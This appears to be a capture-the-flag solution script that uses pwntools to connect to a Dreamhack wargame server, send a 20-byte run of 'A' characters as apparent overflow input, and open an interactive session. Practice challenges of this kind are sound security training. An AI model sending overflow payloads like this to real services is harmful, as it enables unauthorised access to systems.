from pwn import *

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 9068
r = remote(HOST, PORT)

r.sendline(b'A' * 20)
r.interactive()